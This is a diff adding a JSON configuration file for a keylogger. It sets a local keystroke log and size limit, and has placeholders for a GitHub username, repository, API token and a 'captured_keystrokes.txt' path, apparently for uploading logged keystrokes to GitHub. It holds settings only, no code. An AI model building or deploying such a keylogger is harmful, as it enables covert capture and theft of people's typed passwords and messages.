@@ -1,0 +1,15 @@
+{
+  "gh": {
+    "user": "your github username",
+    "repo": "your github repository",
+    "api_token": "github api token",
+    "file_path": "captured_keystrokes.txt"
+  },
+  "keylogger": {
+    "log_file": "keystrokes.txt",
+    "log_size_limit": 1024
+  },
+  "options": {
+    "datetime_format": "%Y-%m-%dT%H:%M:%SZ"
+  }
+}
